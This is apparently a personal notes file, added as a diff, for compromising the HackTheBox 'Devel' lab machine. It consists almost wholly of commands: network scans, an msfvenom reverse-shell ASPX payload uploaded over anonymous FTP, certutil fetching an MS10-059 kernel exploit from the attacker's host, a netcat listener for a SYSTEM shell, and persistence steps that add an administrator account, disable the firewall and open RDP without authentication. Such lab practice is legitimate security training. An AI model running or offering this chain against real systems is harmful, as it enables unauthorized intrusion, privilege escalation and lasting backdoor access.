@@ -1,0 +1,36 @@
+Ref: 
+Manual https://0xdf.gitlab.io/2019/03/05/htb-devel.html
+MSF: https://exp1o1t9r.com/2020/01/07/hackthebox-writeup-devel/
+
+nmap -p- -T4 -A -v 10.10.10.5
+nmap -v --script=vuln 10.10.10.5 -p21  -T4
+nmap -v --script=vuln 10.10.10.5 -p80  -T4
+
+nmap -v --script exploit -p21 10.10.10.5
+nmap -v -p 21 --script=ftp-anon.nse 10.10.10.5
+
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.9 LPORT=6789 -f aspx > myshell.aspx
+
+ftp -p 10.10.10.5
+anonymous/blank
+binary
+put myshell.aspx
+
+http://10.10.10.5/myshell.aspx
+
+Got normal user
+
+Download this https://github.com/lethanhtung01011980/windows-kernel-exploits-seckwiki/blob/master/MS10-059/MS10-059.exe
+certutil.exe -urlcache -split -f http://10.10.14.9/MS10-059.exe C:\Windows\Temp\MS10-059.exe
+
+nc -nlvp 9999
+MS10-059.exe 10.10.14.9 9999
+
+Got system shell
+net user newuser newpass /add
+net localgroup administrators newuser /add
+netsh advfirewall set allprofiles state off
+
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
+
